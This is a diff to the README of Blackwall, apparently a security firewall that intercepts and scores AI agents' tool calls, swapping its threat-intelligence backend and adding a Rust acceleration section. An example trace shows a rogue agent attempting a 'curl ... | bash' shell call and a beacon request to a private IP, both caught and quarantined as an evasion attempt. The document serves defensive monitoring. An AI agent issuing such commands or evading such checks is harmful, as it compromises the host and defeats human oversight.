@@ -17,7 +17,7 @@ Blackwall is an autonomous **Agentic Security Firewall** designed to intercept e
 
 ## 🏗 Architecture Overview
 
-The diagram below illustrates the original end-to-end interception flow across the agent tool boundary, Python runtime audit hooks, local Threat Signature Graph (TSG), and the Google Threat Intelligence (GTI) / Vertex AI semantic triage pipeline:
+The diagram below illustrates the original end-to-end interception flow across the agent tool boundary, Python runtime audit hooks, local Threat Signature Graph (TSG), and the Threat Intelligence / Vertex AI semantic triage pipeline:
 
 ![Blackwall Guardian Agent: Experimental Interception Architecture](assets/Blackwall_mermaid_diagram_gradient_theme.png)
 
@@ -32,7 +32,7 @@ The diagram below illustrates the original end-to-end interception flow across t
 - **Python 3.11+**
 - **Rust 1.70+ (`cargo` / `rustc`)** (for compiling native acceleration extension `blackwall._core_rs`)
 - **Google Cloud Platform Project** with Vertex AI API enabled (100% GCP Vertex AI Mode via Application Default Credentials)
-- **VirusTotal API key** (free tier: 4 queries/minute token bucket)
+- **AlienVault OTX API key** (free tier: 10,000 req/hour token bucket) or VirusTotal API key (legacy fallback)
 - **Git**
 
 ### 1. Installation
@@ -56,7 +56,7 @@ pip install -e ".[dev]" && pip install certifi
 cp .env.example .env
 
 # Edit .env:
-# Set: GCP_PROJECT, GTI_MCP_API_KEY, BLACKWALL_VAULT_KEY
+# Set: GCP_PROJECT, OTX_API_KEY (or GTI_MCP_API_KEY), BLACKWALL_VAULT_KEY
 ```
 
 ### 3. Run the Live Dual-Agent Showdown (Rich Dual-Column TUI)
@@ -122,6 +122,15 @@ Blackwall provides two operational tiers tailored to developer workstations and 
 > [!TIP]
 > **Enterprise Developers**: For executable Python recipes covering ZeroMQ Threat Mesh, Secret Vault Sidecars, gVisor pipeline sandboxing, and Pillar 6 Swarm/Exploit Chain analyzers, see the **[Enterprise Usage Guide](docs/enterprise_usage_guide.md)** and **[ENTERPRISE_ARCHITECTURE.md](ENTERPRISE_ARCHITECTURE.md)**.
 
+### ⚡ Native Rust Acceleration Subsystem (`crates/blackwall_core_rs/` / `blackwall._core_rs`)
+
+To achieve microsecond-speed execution without compromising high-level Python orchestration, Blackwall accelerates CPU-bound hot paths using a compiled Rust PyO3 extension governed by the **Non-Greedy Rewrite Philosophy (95% Python / 5% Rust)** (see [ADR 0005](docs/adr/0005-rust-native-acceleration-hotpaths.md) and [.kiro/specs/blackwall-rust-acceleration/](.kiro/specs/blackwall-rust-acceleration/)):
+- **Context Hygiene:** Linear-time DFA regex sanitization (<50µs on 10KB payloads) with zero ReDoS risk.
+- **Batch Vector Math:** SIMD auto-vectorized cosine similarity (≥35× speedup vs. Python) for 768-dim embeddings.
+- **Fast IOC Extraction & Shannon Entropy:** Native string analysis and entropy calculation (<35µs combined).
+- **Graph DFS Path Traversal:** Graph traversal and temporal two-pointer swarm alignment (<500µs for 500 nodes).
+- **Pure-Python Fallback Guarantee:** Transparent fallback to pure Python if the native extension is uncompiled.
+
 ---
 
 ## 🎯 Core Innovations
@@ -138,7 +147,7 @@ Dual-layer defense combining microsecond speed with semantic intelligence:
 ```
 Structural Layer (Fast Path)              Semantic Layer (Deep Triage)
 ├─ YAML deterministic rules (<5ms)        ├─ LLM intent analysis + scoring (<100ms)
-├─ Tool name + role-based access          ├─ GTI IOC validation (VirusTotal)
+├─ Tool name + role-based access          ├─ Threat Intel IOC validation (AlienVault OTX)
 ├─ Instant ALLOW / BLOCK                  ├─ AST-based code analysis (codebase-memory-mcp)
 └─ Zero LLM API calls                     ├─ Threat Signature Graph vector search
                                           └─ Weighted threat score [0.0, 1.0]
@@ -172,10 +181,10 @@ Rogue Agent retries: ToolCallContext(tool="execute_shell", args=["curl ... | bas
 Rogue Agent retries: ToolCallContext(tool="http_request", args=["http://192.168.1.100:8080"])
   ↓ Layer 3: Threat Signature Graph
     New IP 192.168.1.100 not in local cache (Wave 2 evasion attempt)
-  ↓ Layer 4: GTI MCP
-    VirusTotal: 192.168.1.100 flagged as C2 beacon infrastructure ⚠️
+  ↓ Layer 4: Threat Intelligence Engine
+    AlienVault OTX: 192.168.1.100 flagged in 3 pulses as C2 beacon infrastructure ⚠️
   ↓ Layer 5: Semantic Gating
-    Threat score: GTI=0.95 + CBM=0.5 + Context=0.6 = 0.71 → QUARANTINE ⚠️
+    Threat score: ThreatIntel=0.95 + CBM=0.5 + Context=0.6 = 0.71 → QUARANTINE ⚠️
 
 Learning: Threat signature written to SQLite
   * Attack pattern: IP + port 8080 + POST /api/beacon
@@ -246,13 +255,13 @@ F1 Score (Malicious):      96.1%
 | **Batching** | None (1 req / interception) | Yes (up to 5 reqs / batch) |
 | **Rate Limit** | 300 RPM (token bucket) | 300 RPM (token bucket) |
 | **Context Caching** | None | Server-side (`previous_interaction_id`) |
-| **GTI / CBM Queries** | Awaits CBM, then conditionally awaits GTI (high-risk only) | Batched API evaluation without inline MCP gather |
+| **Threat Intel / CBM Queries** | Awaits CBM, then conditionally awaits Threat Intel (high-risk only) | Batched API evaluation without inline MCP gather |
 | **Signature Generation** | Asynchronous background task (`loop.create_task`) | Asynchronous background task / webhook |
 | **Billing Mode** | 100% GCP Vertex AI Mode (Paid Tier) | 100% GCP Vertex AI Mode (Paid Tier) |
 
 ### Three-Tier Evaluation Model
 - **Tier 1: Structural Gating** (<5ms, deterministic): In-memory YAML policy evaluation without LLM calls. Returns `ALLOW`, `BLOCK`, or `ESCALATE`.
-- **Tier 2: Rapid Semantic Triage** (<100ms @ P99, Gemini 3.5 Flash-Lite): CBM AST analysis with conditional GTI MCP queries for high-risk indicators, evaluated via Gemini 3.5 Flash-Lite with structured Pydantic output.
+- **Tier 2: Rapid Semantic Triage** (<100ms @ P99, Gemini 3.5 Flash-Lite): CBM AST analysis with conditional Threat Intel queries (AlienVault OTX / GTI) for high-risk indicators, evaluated via Gemini 3.5 Flash-Lite with structured Pydantic output.
 - **Tier 3: Deep Reasoning** (Background, non-blocking, Gemini 3.8 Flash): Asynchronous behavioral analysis and threat signature synthesis triggered after `BLOCK`/`QUARANTINE` verdicts. Zero added latency to the execution path.
 
 ---
@@ -287,8 +296,8 @@ pytest tests/features/ -v
 
 | Document | Purpose |
 | :--- | :--- |
-| **[ARCHITECTURE.md](ARCHITECTURE.md)** | Technical deep-dive into Blackwall Core (Hybrid Gating, Async Batching, SQLite TSG, MCPs) |
-| **[ENTERPRISE_ARCHITECTURE.md](ENTERPRISE_ARCHITECTURE.md)** | Technical overview of Blackwall Enterprise Mesh (Pillars 1–6, eBPF, ZeroMQ, Vault sidecars) |
+| **[ARCHITECTURE.md](ARCHITECTURE.md)** | Technical deep-dive into Blackwall Core (Hybrid Gating, Async Batching, SQLite TSG, Rust Acceleration, MCPs) |
+| **[ENTERPRISE_ARCHITECTURE.md](ENTERPRISE_ARCHITECTURE.md)** | Technical overview of Blackwall Enterprise Mesh (Pillars 1–6, eBPF, ZeroMQ, Vault sidecars, Swarm Correlator) |
 | **[docs/enterprise_usage_guide.md](docs/enterprise_usage_guide.md)** | Executable Python code recipes and API guides for all 6 Enterprise Mesh pillars |
 | **[DEMO_HARNESS_ARCHITECTURE.md](DEMO_HARNESS_ARCHITECTURE.md)** | Dual-agent adversarial showdown architecture and Rich TUI specifications |
 | **[LIVE_CYBENCH_CLOUD_TRACE_EVAL_GUIDE.md](LIVE_CYBENCH_CLOUD_TRACE_EVAL_GUIDE.md)** | Live evaluation & Google Cloud Trace guide (100% GCP Vertex AI Mode) |
@@ -296,8 +305,10 @@ pytest tests/features/ -v
 | **[docs/ci_evaluation_stage_template.md](docs/ci_evaluation_stage_template.md)** | Production CI/CD stage integration template and Google Cloud WIF setup |
 | **[docs/graph_export_tools_guide.md](docs/graph_export_tools_guide.md)** | Attack graph export and visualization guide (NetworkX, Gephi, Cytoscape.js) |
 | **[docs/helper_functions.md](docs/helper_functions.md)** | Catalog of centralized validation helpers, utilities, and date/UUID formatters |
+| **[docs/adr/0005-rust-native-acceleration-hotpaths.md](docs/adr/0005-rust-native-acceleration-hotpaths.md)** | ADR 0005: Non-Greedy Rust Native Acceleration for Latency-Critical Interception Hot Paths |
 | **[KNOWN_ISSUES.md](KNOWN_ISSUES.md)** | Known issues and performance workarounds |
 | **[AGENTS.md](AGENTS.md)** | Supreme Agent Constitution, architectural invariants, and workspace rules |
+| **[.kiro/specs/blackwall-rust-acceleration/](.kiro/specs/blackwall-rust-acceleration/)** | Technical design, requirements, and tasks for Native Rust Acceleration Subsystem |
 | **[.kiro/specs/](.kiro/specs/)** | Complete technical specifications (requirements, designs, tasks) for all subsystems |
 
 ---
@@ -305,7 +316,11 @@ pytest tests/features/ -v
 ## 💡 Key Architectural Insights
 
 - **Why Batching Works Against 600 RPM Attacks:** Adversarial agents running in parallel can generate 600+ RPM, while LLM provider quotas often enforce a 300 RPM ceiling. Blackwall's `InterceptionQueue` suspends incoming callbacks and flushes batches of up to 5 events (or 100ms timeout) in a single Gemini Interactions API call, yielding up to 1,500 operations/minute capacity.
-- **Why GTI Budget Tracking Matters:** VirusTotal's free tier limits queries to 4 per 60 seconds (1 token per 15s). Blackwall uses `GTIQueryBudgetTracker` token-bucket rate limiting to reserve GTI validation strictly for high-risk unknown indicators, redistributing signal weights to local AST (CBM) and context when the budget is exhausted.
+- **High-Capacity Threat Intelligence (AlienVault OTX & SQLite Cache):**
+  - **AlienVault OTX:** 10,000 requests/hour (~166 RPM) at $0/month (replacing the legacy 4 RPM VirusTotal bottleneck).
+  - **Fast-Path SQLite Cache:** Sub-millisecond (<1ms) lookups for known indicators, preventing repeated external network latency.
+  - **3-State Circuit Breaker:** Proactive failure isolation with 3-probe HALF-OPEN recovery.
+  - **Legacy VirusTotal Mode:** Retained as an opt-in fallback under `BW_THREAT_INTEL_BACKEND=virustotal`.
 - **Why Threat Signatures Enable 100x+ Speedup:** Novel attacks require external intelligence lookups and LLM evaluation (~1,415ms). Once blocked, Blackwall writes a normalized vector signature to local SQLite. Future variants match via cosine similarity in ~12ms—a **118x speedup** with zero LLM inference.
 
 ---
